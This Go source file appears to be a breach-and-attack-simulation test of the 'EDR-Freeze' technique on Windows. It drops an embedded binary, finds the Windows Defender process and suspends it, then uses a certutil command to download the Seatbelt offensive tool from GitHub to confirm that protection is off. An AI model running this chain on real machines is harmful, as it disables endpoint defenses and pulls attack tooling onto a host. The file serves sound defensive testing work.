//go:build windows
// +build windows

/*
ID: 87b7653b-2cee-44d4-9d80-73ec94d5e18e
NAME: EDR-Freeze Defense Evasion
TECHNIQUES: T1562.001, T1055, T1574
TACTICS: defense-evasion, privilege-escalation
SEVERITY: high
TARGET: windows-endpoint
COMPLEXITY: medium
THREAT_ACTOR: N/A
SUBCATEGORY: edr-evasion
TAGS: edr-freeze, process-injection, dll-hijacking, defender-tampering
UNIT: response
CREATED: 2025-09-23
AUTHOR: sectest-builder
*/
package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

const (
	TEST_UUID = "87b7653b-2cee-44d4-9d80-73ec94d5e18e"
	TEST_NAME = "EDR-Freeze Defense Evasion"
	VERSION   = "1.0.0"
)

//go:embed EDR-Freeze.exe
var edrFreezeExe []byte

func findDefenderPID() (int, string, error) {
	defenderProcesses := []string{
		"MsMpEng.exe",
		"MpDefenderCoreService.exe",
		"NisSrv.exe",
	}

	for _, procName := range defenderProcesses {
		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", procName), "/FO", "CSV", "/NH")
		output, err := cmd.Output()
		if err != nil {
			continue
		}

		lines := strings.Split(strings.TrimSpace(string(output)), "\n")
		for _, line := range lines {
			if strings.Contains(line, procName) {
				fields := strings.Split(line, ",")
				if len(fields) >= 2 {
					pidStr := strings.Trim(fields[1], "\"")
					var pid int
					_, err := fmt.Sscanf(pidStr, "%d", &pid)
					if err == nil && pid > 0 {
						return pid, procName, nil
					}
				}
			}
		}
	}

	return 0, "", fmt.Errorf("no Defender process found")
}

func test() (int, string) {
	// Phase 1: Setup
	LogPhaseStart(0, "Setup")
	Endpoint.Say("[*] Phase 0: Test Setup")

	targetDir := "c:\\F0"
	os.MkdirAll(targetDir, 0755)

	edrFreezePath := filepath.Join(targetDir, "EDR-Freeze.exe")
	err := os.WriteFile(edrFreezePath, edrFreezeExe, 0755)
	if err != nil {
		LogMessage("ERROR", "Setup", fmt.Sprintf("Failed to drop EDR-Freeze.exe: %v", err))
		LogPhaseEnd(0, "failed", "Failed to write binary")
		return 999, fmt.Sprintf("Failed to drop EDR-Freeze.exe: %v", err)
	}

	LogFileDropped("EDR-Freeze.exe", edrFreezePath, int64(len(edrFreezeExe)), false)
	LogPhaseEnd(0, "success", "Binary extracted successfully")
	Endpoint.Say("    [+] Dropped EDR-Freeze.exe (%d bytes)", len(edrFreezeExe))
	Endpoint.Say("")

	// Phase 2: Quarantine Check
	LogPhaseStart(1, "Quarantine Check")
	Endpoint.Say("[*] Phase 1: Checking for defensive reaction to EDR-Freeze.exe")

	time.Sleep(3 * time.Second)

	// Use os.Stat() for quarantine detection (Bug Prevention Rule #3)
	if _, statErr := os.Stat(edrFreezePath); statErr != nil {
		LogMessage("INFO", "Quarantine Check", "EDR-Freeze.exe was quarantined by endpoint protection")
		LogFileDropped("EDR-Freeze.exe", edrFreezePath, int64(len(edrFreezeExe)), true)
		LogPhaseEnd(1, "blocked", "Binary quarantined on extraction")
		Endpoint.Say("    [!] EDR-Freeze.exe was quarantined!")
		return 105, "EDR-Freeze.exe was quarantined on extraction"
	}

	LogPhaseEnd(1, "success", "Binary survived quarantine check")
	Endpoint.Say("    [+] EDR-Freeze.exe survived quarantine check")
	Endpoint.Say("")

	// Phase 3: Find Defender Process
	LogPhaseStart(2, "Defender Discovery")
	Endpoint.Say("[*] Phase 2: Finding Windows Defender process...")

	defenderPID, procName, err := findDefenderPID()
	if err != nil {
		LogMessage("ERROR", "Defender Discovery", fmt.Sprintf("Could not find Defender process: %v", err))
		LogPhaseEnd(2, "failed", "No Defender process found")
		Endpoint.Say("    [-] Could not find Defender process: %v", err)
		Endpoint.Say("    [-] Test cannot proceed without target process")
		return 999, "Defender process not found - test cannot proceed"
	}

	LogMessage("INFO", "Defender Discovery", fmt.Sprintf("Found: %s (PID: %d)", procName, defenderPID))
	LogPhaseEnd(2, "success", fmt.Sprintf("Found %s (PID: %d)", procName, defenderPID))
	Endpoint.Say("    [+] Found Defender process: %s (PID: %d)", procName, defenderPID)
	Endpoint.Say("")

	// Phase 4: Execute EDR-Freeze
	LogPhaseStart(3, "EDR-Freeze Execution")
	Endpoint.Say("[*] Phase 3: Executing EDR-Freeze to suspend Defender for 10 seconds...")

	cmd := exec.Command(edrFreezePath, fmt.Sprintf("%d", defenderPID), "10000")
	cmd.Dir = targetDir
	err = cmd.Start()
	if err != nil {
		LogMessage("INFO", "EDR-Freeze Execution", fmt.Sprintf("Execution was prevented: %v", err))
		LogProcessExecution("EDR-Freeze.exe", fmt.Sprintf("%s %d 10000", edrFreezePath, defenderPID), 0, false, 126, err.Error())
		LogPhaseEnd(3, "blocked", "EDR-Freeze execution was prevented")
		Endpoint.Say("    [!] EDR-Freeze execution was prevented: %v", err)
		return 126, "EDR-Freeze execution was prevented by endpoint protection"
	}

	LogProcessExecution("EDR-Freeze.exe", fmt.Sprintf("%s %d 10000", edrFreezePath, defenderPID), cmd.Process.Pid, true, 0, "")
	Endpoint.Say("    [+] EDR-Freeze started (PID: %d), waiting 2 seconds for suspension...", cmd.Process.Pid)
	time.Sleep(2 * time.Second)
	LogPhaseEnd(3, "success", "EDR-Freeze started successfully")
	Endpoint.Say("")

	// Phase 5: Verify Defender Suspension
	LogPhaseStart(4, "Suspension Verification")
	Endpoint.Say("[*] Phase 4: Testing if Defender is suspended by downloading malicious tool with certutil...")

	seatbeltPath := "c:\\F0\\Seatbelt.exe"
	certutilCmd := exec.Command("certutil.exe", "-urlcache", "-f",
		"https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x86/Seatbelt.exe",
		seatbeltPath)
	certutilCmd.Dir = targetDir

	certOutput, certErr := certutilCmd.CombinedOutput()

	if certErr != nil {
		LogMessage("INFO", "Suspension Verification", fmt.Sprintf("Certutil download was prevented: %v", certErr))
		LogProcessExecution("certutil.exe", "certutil.exe -urlcache -f <url> Seatbelt.exe", 0, false, 126, certErr.Error())
		LogPhaseEnd(4, "blocked", "Download was prevented - Defender still active")
		Endpoint.Say("    [!] Certutil download was prevented: %v", certErr)
		Endpoint.Say("    [+] Defender prevented malicious download - system is protected")
		return 126, "Defender prevented malicious download despite EDR-Freeze - system protected"
	}

	if _, err := os.Stat(seatbeltPath); err == nil {
		LogMessage("CRITICAL", "Suspension Verification", "Seatbelt.exe downloaded successfully - Defender was suspended")
		LogProcessExecution("certutil.exe", "certutil.exe -urlcache -f <url> Seatbelt.exe", 0, true, 0, "")
		LogFileDropped("Seatbelt.exe", seatbeltPath, 0, false)
		LogPhaseEnd(4, "success", "Malicious download succeeded - Defender was suspended")
		Endpoint.Say("    [!] Certutil successfully downloaded Seatbelt.exe")
		Endpoint.Say("    [!] Defender was successfully suspended - system is UNPROTECTED")
		os.Remove(seatbeltPath)
		return 101, "Defender suspended by EDR-Freeze - malicious download succeeded"
	}

	LogMessage("INFO", "Suspension Verification", fmt.Sprintf("Download outcome unclear: %s", string(certOutput)))
	LogPhaseEnd(4, "blocked", "Download outcome unclear - treating as protected")
	Endpoint.Say("    [?] Download outcome unclear: %s", string(certOutput))
	return 126, "Download outcome unclear - endpoint appears protected"
}

func main() {
	Endpoint.Say("=================================================================")
	Endpoint.Say("F0RT1KA Security Test: %s", TEST_NAME)
	Endpoint.Say("Test UUID: %s", TEST_UUID)
	Endpoint.Say("Version: %s", VERSION)
	Endpoint.Say("=================================================================")
	Endpoint.Say("")

	// Initialize logger with Schema v2.0 metadata and execution context
	metadata := TestMetadata{
		Version:  VERSION,
		Category: "defense_evasion",
		Severity: "high",
		Techniques: []string{
			"T1562.001", // Impair Defenses: Disable or Modify Tools
			"T1055",     // Process Injection
			"T1574",     // Hijack Execution Flow
		},
		Tactics:       []string{"defense-evasion", "privilege-escalation"},
		Score:         8.5,
		RubricVersion: "v1",
		Tags:          []string{"edr-freeze", "process-injection", "dll-hijacking", "defender-tampering"},
	}

	// Resolve organization info
	orgInfo := ResolveOrganization("")

	// Define execution context
	executionContext := ExecutionContext{
		ExecutionID:    uuid.New().String(),
		Organization:   orgInfo.UUID,
		Environment:    "lab",
		DeploymentType: "manual",
		Configuration: &ExecutionConfiguration{
			TimeoutMs:         120000, // 2 minutes
			CertificateMode:   "pre-installed",
			MultiStageEnabled: false,
		},
	}

	// Initialize logger with v2.0 signature
	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)

	Endpoint.Say("Organization: %s", orgInfo.ShortName)
	Endpoint.Say("Execution ID: %s", executionContext.ExecutionID)
	Endpoint.Say("")

	// Panic recovery
	defer func() {
		if r := recover(); r != nil {
			LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
			SaveLog(999, fmt.Sprintf("Panic: %v", r))
			os.Exit(999)
		}
	}()

	// Run test with timeout
	type testResult struct {
		exitCode   int
		exitReason string
	}

	done := make(chan testResult, 1)
	go func() {
		code, reason := test()
		done <- testResult{code, reason}
	}()

	timeout := 2 * time.Minute
	select {
	case result := <-done:
		SaveLog(result.exitCode, result.exitReason)
		os.Exit(result.exitCode)
	case <-time.After(timeout):
		Endpoint.Say("[!] Test timed out after %v", timeout)
		LogMessage("ERROR", "Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
		SaveLog(999, fmt.Sprintf("Test exceeded timeout of %v", timeout))
		os.Exit(999)
	}
}
